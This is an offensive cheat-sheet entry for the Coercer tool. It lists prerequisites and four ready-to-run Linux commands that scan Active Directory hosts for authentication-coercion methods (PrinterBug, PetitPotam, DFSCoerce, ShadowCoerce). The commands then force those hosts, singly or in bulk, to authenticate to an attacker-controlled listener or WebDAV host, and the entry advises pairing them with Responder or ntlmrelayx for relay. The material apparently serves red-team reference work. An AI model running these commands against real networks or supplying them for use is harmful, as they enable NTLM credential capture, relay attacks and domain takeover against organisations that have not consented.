---
technique: Coercer
category: mitm
targets: Domain Computers, Domain Controllers
protocols: RPC, SMB, HTTP
remote_capable: true
tags: coercer coercion ntlm-relay printerbug petitpotam dfscoerce shadowcoerce ad
---

# Coercer

Coercer scans and triggers RPC authentication coercion methods such as PrinterBug, PetitPotam, DFSCoerce, and ShadowCoerce. Pair it with Responder, ntlmrelayx, or a Kerberos relay listener depending on the target protocol.

## Prerequisites

| Requirement | Detail |
|-------------|--------|
| Domain credentials | Most patched environments require authenticated RPC calls |
| Listener | Prepare capture or relay infrastructure before triggering coercion |
| Target reachability | RPC ports and named pipes must be reachable from the operator host |

## Windows

No Windows operator command is included here. The local `cheats/coercer.md` source confirms Linux Coercer usage.

## Linux

### Scan coercion methods

#coercer #recon

Enumerate coercion RPC methods exposed by a target without triggering authentication.

```sh title:"Scan target for coercion methods with Coercer"
coercer scan -d "$domain" -u "$user" $auth_flags -t "$rhost_ip"
```
<!-- cheat
import domain_ip
import users
import coercer_auth
-->

### Coerce to listener

#coercer #ntlm-relay

Force the target to authenticate to an attacker-controlled listener IP.

```sh title:"Coerce target authentication to listener IP"
coercer coerce -d "$domain" -u "$user" $auth_flags -t "$rhost_ip" -l "$lhost"
```
<!-- cheat
import domain_ip
import users
import coercer_auth
import tun_ip
-->

### Coerce via WebDAV hostname

#coercer #webdav #http-relay

Force authentication toward a WebDAV hostname for HTTP relay paths.

```sh title:"Coerce target authentication to WebDAV hostname"
coercer coerce -d "$domain" -u "$user" $auth_flags -t "$rhost_ip" --webdav-host "$listener_hostname"
```
<!-- cheat
import domain_ip
import users
import coercer_auth
var listener_hostname
-->

### Bulk coerce targets

#coercer #bulk

Trigger coercion against every target listed in a file.

```sh title:"Bulk coerce targets from file with Coercer"
coercer coerce -d "$domain" -u "$user" $auth_flags --targets-file "$targets_file" -l "$lhost"
```
<!-- cheat
import domain_ip
import users
import coercer_auth
import tun_ip
var targets_file
-->
